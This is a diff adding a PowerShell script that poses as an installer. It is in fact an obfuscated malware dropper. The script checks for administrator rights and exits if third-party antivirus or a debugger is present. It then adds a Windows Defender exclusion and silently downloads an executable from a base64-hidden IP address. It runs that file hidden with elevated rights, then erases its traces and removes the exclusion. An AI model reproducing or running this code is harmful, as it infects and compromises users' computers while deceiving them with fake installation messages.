@@ -1,0 +1,120 @@
+$e = "1"
+if ([Environment]::GetEnvironmentVariable($e, "Machine") -eq "1") {
+    Write-Host "Exiting..."
+    exit 1
+}
+
+function F1 {
+    try {
+        $a = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups -contains "S-1-5-32-544"
+        if (-not $a) {
+            Write-Host "Exiting..."
+            return $false
+        } else {
+            Write-Host "Continuing..."
+            return $true
+        }
+    } catch {
+        Write-Host "Exiting..."
+        return $false
+    }
+}
+
+if (-not (F1)) {
+    exit 1
+}
+
+function F2 {
+    try {
+        $x = Get-WmiObject -Namespace ("root" + "\SecurityCenter2") -Class AntiVirusProduct -ErrorAction Stop
+        if (-not $x) {
+            Write-Host "Continuing..."
+            return $false
+        }
+        foreach ($p in $x) {
+            if ($p.displayName -notlike "*Windows Defender*" -and $p.displayName -notlike "*Microsoft Defender*") {
+                Write-Host "Exiting..."
+                return $true
+            }
+        }
+        Write-Host "Checking the installation package..."
+        return $false
+    } catch {
+        Write-Host "Exiting..."
+        return $true
+    }
+}
+
+function F3 {
+    try {
+        if ([System.Diagnostics.Debugger]::IsAttached) {
+            Write-Host "Exiting..."
+            return $true
+        }
+    } catch {
+        Write-Host "Exiting..."
+        return $true
+    }
+    return $false
+}
+
+if (F2 -or F3) {
+    exit 1
+}
+
+$d1 = "aHR0cDovLzk0LjE1NC4zNS4xMTUvdXNlcl9wcm9maWxlc19waG90by9zdGxjLmV4ZQ=="
+$d2 = "dXBkYXRlci5leGU="
+$a1 = "SGlkZGVu"
+$a2 = "U2lsZW50bHljb250aW51ZQ=="
+$a3 = "U3RvcA=="
+$a4 = "RGlyZWN0b3J5"
+$a5 = "UnVuQXM="
+
+$enc = [System.Text.Encoding]::UTF8
+$conv = [System.Convert]
+
+$url = $enc.GetString($conv::FromBase64String($d1))
+$exe = $enc.GetString($conv::FromBase64String($d2))
+$attr = $enc.GetString($conv::FromBase64String($a1))
+$ea = $enc.GetString($conv::FromBase64String($a2))
+$stop = $enc.GetString($conv::FromBase64String($a3))
+$dir = $enc.GetString($conv::FromBase64String($a4))
+$verb = $enc.GetString($conv::FromBase64String($a5))
+
+$tmp = Join-Path $env:LOCALAPPDATA ([guid]::NewGuid().ToString())
+New-Item -ItemType $dir -Path $tmp | Out-Null
+$out = Join-Path $tmp $exe
+
+function AddExcl {
+    param ([string]$p)
+    try {
+        Add-MpPreference -ExclusionPath $p -ErrorAction $ea
+    } catch {}
+}
+
+function RemExcl {
+    param ([string]$p)
+    try {
+        Remove-MpPreference -ExclusionPath $p -ErrorAction $ea
+    } catch {}
+}
+
+try {
+    AddExcl -p $tmp
+    Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 5)
+    Write-Host "Please wait..."
+    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop
+    Set-ItemProperty -Path $tmp -Name Attributes -Value $attr
+    Set-ItemProperty -Path $out -Name Attributes -Value $attr
+    Start-Process -FilePath $out -WindowStyle Hidden -Verb $verb -Wait
+    Remove-Item $tmp -Recurse -Force
+
+    while (Test-Path $tmp) { Start-Sleep -Seconds 2 }
+
+    RemExcl -p $tmp
+    [Environment]::SetEnvironmentVariable($e, "1", "Machine")
+} catch {
+    exit 1
+} finally {
+    Write-Host "The installation process is complete."
+}
